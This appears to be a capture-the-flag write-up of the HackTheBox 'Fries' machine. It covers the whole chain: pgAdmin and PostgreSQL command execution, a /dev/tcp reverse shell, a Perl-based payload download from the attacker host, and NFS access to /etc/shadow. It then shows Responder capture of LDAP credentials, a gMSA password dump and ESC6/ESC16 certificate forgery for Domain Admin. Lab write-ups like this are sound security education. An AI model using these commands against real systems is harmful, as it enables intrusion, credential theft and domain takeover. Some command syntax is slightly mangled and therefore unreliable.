## HTB Fries — Complete Writeup

A comprehensive walkthrough of HackTheBox’s Fries machine — combining Docker container exploitation, NFS misconfigurations, and Active Directory Certificate Services attacks Fries is a Hard-difficulty machine on HackTheBox that masterfully combines
multiple attack vectors: web application exploitation, container escape techniques, NFS vulnerabilities, LDAP credential capture, and modern Active Directory Certificate Services (AD CS) attacks. This writeup will guide you through the complete exploitation chain from initial foothold to Domain Admin.


## Box Information
```
Name: Fries
Difficulty: Hard
OS: Windows Server 2019 (DC) + Linux (Docker host)
Domain: fries.htb
Initial credentials: d.cooper@fries.htb / D4LE11maan!!
Exploitation Summary
1. Reconnaissance and initial access via pgAdmin
2. PostgreSQL RCE and container shell
3. NFS exploration and file retrieval
4. LDAP credentials capture via Responder
5. GMSA password dump
6. CA configuration for ESC6 + ESC16
7. Administrator certificate request
8. Authentication and flag retrieval
```
## Nmap
```
nmap -sS -p- - min-rate 10000 <IP_Machine> -oN nmap_initial.txt 
nmap -sC -sV -p 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985 <IP_Machine> -oN nmap_detailed.txt
```
## Important discovered ports:
- 22/tcp : SSH (Ubuntu — unusual for a Windows DC)
- 80/tcp : HTTP — Fries restaurant website
- 88/tcp : Kerberos
- 135,139,445/tcp : SMB/RPC
- 389,636,3268,3269/tcp : LDAP/LDAPS (Active Directory)
- 443/tcp : HTTPS — pwm.fries.htb (Password Manager)
- 5985/tcp : WinRM

## Adding hosts

```
echo "<IP_Machine> fries.htb dc01.fries.htb pwm.fries.htb db-mgmt05.fries.htb" >> /etc/hosts
```

## 2. Initial Access — pgAdmin

### pgAdmin Discovery

The initial credentials `d.cooper@fries.htb / D4LE11maan!`! do not work directly on the AD domain (STATUS_LOGON_FAILURE). However, they work on `code.fries.htb` We notice a git repository corresponding to the web application docker. In
the initial commit we can find database credentials in the environment variables.

### pgAdmin Exploitation with Metasploit
```
msfconsole
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS db-mgmt05.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS [DB_PASSWORD]
set DB_NAME ps_db
set LHOST <IP>
set LPORT 4444
exploit
```

Result: Shell in the pgAdmin container as `pgadmin`.

By exploring the container environment variables, we can obtain the pgAdmin web interface credentials.

## 3. PostgreSQL RCE and Postgres Shell
Access to pgAdmin web interface
Direct access to `http://db-mgmt05.fries.htb`
Use the credentials found in the container environment.

#### RCE via Query Tool
Once connected to pgAdmin web:

1. Add a PostgreSQL server:
```
Host : `172.18.0.3`
Port : `5432`
Database : `ps_db`
Username : `root`
Password : [DB_PASSWORD]
```

2. Open Query Tool and execute:

```
DROP TABLE IF EXISTS cmd_test;
CREATE TABLE cmd_test(output text);
COPY cmd_test FROM PROGRAM 'whoami';
SELECT * FROM cmd_test;
```

Result: Command execution confirmed as postgres user.

3. Reverse shell:
Prepare listener on Kali: 

```
nc -lvnp 4445
DROP TABLE IF EXISTS cmd;
CREATE TABLE cmd(output text);
COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4445 0>&1"';
```
Result: Shell as `postgres` in the PostgreSQL container (172.18.0.3).

## 4. Docker Network Exploration
### Shell improvement
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
cd /tmp
```

### Discovery of chisel and nfsclient

In the postgres container `~/data` directory:
```
- chisel : Tunneling tool already present
- Possibility to use nfsclient to explore NFS
```

### nfsclient Download

```
cd /tmp 

# Download with Perl (curl was not available)
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("<IP>:8000");print $s "GET /nfsclient-linux-amd64 HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">nfsclient";binmode F;print F while<$s>;close F'

chmod +x nfsclient
```

Note: On Kali, you must first download nfsclient:

```
wget https://github.com/sahlberg/libnfs/releases/download/libnfs-5.0.3/nfsclient-linux-amd64
python3 -m http.server 8000
```

### NFS share exploration

```
./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59605603 ls
```

This will list directories including certs/, shared/, and webroot/.

#### Retrieval of certificates and sensitive files

```
# List certs directory
./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59605603 ls certs/
```

This reveals certificate files and Linux system files (passwd, shadow).

## 5. Host Filesystem Access via NFS
#### nfs-security-tooling Installation

- On Kali:
```
cd /tmp
git clone https://github.com/hvs-consulting/nfs-security-tooling
cd nfs-security-tooling
# Dependencies installation
sudo apt update
sudo apt install pkg-config libfuse3-dev python3-dev pipx
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
```

### NFS Forward with chisel
In the postgres shell:

```
cd ~/data
./chisel client <IP>:8080 R:111:172.18.0.1:111 R:2049:172.18.0.1:2049 &
```

On Kali, chisel server:
```
./chisel server -p 8080 - reverse
```

Analysis and NFS mounting with root access

```
# Analysis to find the root file handle
nfs_analyze 127.0.0.1 /srv/web.fries.htb
```

This will output the root file handle needed for mounting.

#### Mounting with fuse_nfs:

```
mkdir -p /tmp/mount3 

fuse_nfs /tmp/mount3/ 127.0.0.1 - fake-uid - allow-write - manual-fh [FILE_HANDLE]
```

#### Retrieval of sensitive files

```
cd /tmp/mount3
# Shadow and passwd files from Linux host
cat etc/shadow > /tmp/shadow
cat etc/passwd > /tmp/passwd
# SSL/TLS certificates
cp -r srv/web.fries.htb/certs/* ~/certs/
```

With these files, you can crack password hashes to obtain credentials for PWM access

## 6. LDAPCredentialsCapture — Responder Attack
Access to PWM (Password Manager)
`Access https://pwm.fries.htb with credentials found by cracking the shadow+passwd files.`

#### PWM configuration download
Once logged in, download the PwmConfiguration.xml file from the configuration manager.
#### Configuration modification

Edit `PwmConfiguration.xml` :

```
nano /tmp/PwmConfig_original.xml
# Search for the line with ldaps://dc01.fries.htb:636
# Replace with: ldap://<IP>:389
```
Key modification:

```
<setting key="ldap.serverUrls">
<value>ldap://<IP>:389</value>
</setting>
```

Starting Responder

`sudo responder -I tun0 -v`

#### Upload of modified configuration

Upload the modified PwmConfiguration.xml file through the PWM web interface.

#### Triggering the connection
Access `https://pwm.fries.htb` or restart the PWM service to trigger an LDAP connection attempt.

Credentials capture

## 7. Enumeration with svc_infra

#### GMSA password dump

```
# Using bloodyAD to retrieve the GMSA account password 
bloodyAD - host <IP_Machine> -d fries.htb -u 'svc_infra' -p '[PASSWORD_SVC_INFRA]' get search - filter '(objectClass=msDS-GroupManagedServiceAccount)' - attr sAMAccountName,msDS-ManagedPassword
```

Result: This will display the GMSA account name (gMSA_CA_prod$) and its NTLM hash.

### WinRM connection with gMSA

```
evil-winrm -i <IP_Machine> -u 'gMSA_CA_prod$' -H '[NTLM_HASH_GMSA]'
```
Result: WinRM access as `FRIES\gMSA_CA_prod$`

## 8.CA Permissions Enumeration
Permission verification with Certify.exe
In WinRM:
```
upload /path/to/Certify.exe
# CA permissions verification
.\Certify.exe cas
```
Important results:

- `gMSA_CA_prod$` has ManageCA and Enroll rights
- The account can manage the CA but does not have enrollment rights on most templates
- Accessible templates: Machine (for Domain Computers), User (forDomain Users)

### gMSA groups verification

```
whoami /groups
```
Result: gMSA_CA_prod$ is a member of:
- FRIES\Domain Computers
- BUILTIN\Remote Management Users
- NT AUTHORITY\Authenticated Users
Important: The gMSA is in Domain Computers, NOT in Domain Users!


## 9.CA Configuration for ESC6 + ESC16
ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

Principle: Enables the ability to specify an arbitrary Subject Alternative Name (SAN) in certificate requests.

Configuration with COM API:
```
# Using CertificateAuthority.Admin COM object 

$CA = New-Object -ComObject CertificateAuthority.Admin 
$Config = "DC01.fries.htb\fries-DC01-CA" 
# Calculate the new value 
$current = 1114446  # Current value 
$new = $current -bor 0x00040000
# Add EDITF_ATTRIBUTESUBJECTALTNAME2 flag (262144) 
# New value = 1376590 (0x15014E) # Apply modification 
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new) 
# Restart CA service Restart-Service certsvc -Force
```

#### Verification:

```
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
```

This should display EditFlags with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.
### ESC16 — Disable Extension List
Principle: Disables verification of certain certificate extensions, notably the szOID_NTDS_CA_SECURITY_EXT extension that validates the SID in the certificate.
```
$CA = New-Object -ComObject CertificateAuthority.Admin 
$Config = "DC01.fries.htb\fries-DC01-CA"
# Disable validation of extension 1.3.6.1.4.1.311.25.2 (szOID_NTDS_CA_SECURITY_EXT)

CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")

# Restart CA 

service Restart-Service certsvc -Force 
```
### Verification

```
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\DisableExtensionList
```

Why these two misconfigurations?
- ESC6 allows specifying an arbitrary UPN (e.g., administrator@fries.htb) in the certificate
- ESC16 prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user

## 10. ESC6 + ESC16 Exploitation
Problem: gMSA cannot enroll
The `gMSA_CA_prod$` account:

- Can configure the CA (ManageCA)
- Cannot enroll on the User template (is not in Domain Users)
- Could enroll on Machine (is in Domain Computers) but requires SYSTEM rights

Solution: Use svc_infra

The `svc_infra` account:

- Is a normal user (probably in Domain Users) Can enroll on the User template Can request a certificate with alternative UPN thanks to ESC6

Certificate request for Administrator
On Kali, synchronize time first:

```
sudo ntpdate <IP_Machine>
```

Certificate request with svc_infra:

```
certipy-ad req -u 'svc_infra@fries.htb' -p '[PASSWORD_SVC_INFRA]' -dc-ip <IP_Machine> -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```


Important parameters:

- template ‘User’` : Template on which svc_infra can enroll
- `-upn ‘administrator@fries.htb’` : Administrator’s UPN (thanks to ESC6)
- `-sid ‘[ADMINISTRATOR_SID]’` : Administrator’s SID (should end in -500)

Result: Certificate successfully requested and saved as administrator.pfx

### 11. Authentication as Administrator
TGT and NTLM hash retrieval
```
certipy-ad auth -pfx administrator.pfx -dc-ip <IP_Machine>
```
Result: This will retrieve the Administrator’s NTLM hash through PKINIT authentication.
WinRM connection as Administrator

```
evil-winrm -i <IP_Machine> -u 'administrator' -H '[NTLM_HASH_ADMINISTRATOR]'
```

Result: Full access to the DC as FRIES\Administrator

## 12. Flag Retrieval

```
Flags
type C:\Users\Administrator\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

### Techniques Used for this box
```
1. Container Escape : Pivot from pgAdmin container -> PostgreSQL -> Docker
Host
2. NFS Exploitation : Filesystem access with fake root UID
3. LDAP Credential Capture : Config modification + Responder
4. GMSA Password Dump : Reading msDS-ManagedPassword via LDAP
5. ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) : Allows arbitrary SAN
6. ESC16 (DisableExtensionList) : Disables SID validation
7. Pass-the-Certificate : Kerberos PKINIT authentication
```
## BoxKey Points
Why doesn’t ESC7 work?
- Although `gMSA_CA_prod$` has ManageCA rights, the CA was not configured for the enrollment agent workflow. ESC7 requires:

- Templates configured for the enrollment agent Additional permissions that were not present

Why use svc_infra for certificate request?
- `gMSA_CA_prod$` is in Domain Computers, not Domain Users
- The User template only accepts enrollment from Domain Users
- The Machine template requires SYSTEM rights to request from a user
### context
- svc_infra is a normal user in Domain Users and can enroll on User

## Importance of ESC16
- ESC16 (DisableExtensionList) is crucial because:
Without it, the DC verifies that the SID in the certificate matches the
requesting user With ESC16, this verification is disabled
- This allows impersonating Administrator with a certificate requested by
svc_infra

## RPC problems from Kali
RPC connection attempts from Kali systematically failed:
`[Errno 111] Connection refused` on endpoint mapper
Solution: Request certificates from WinRM
Finally, time synchronization and using `-dc-ip` solved the problem
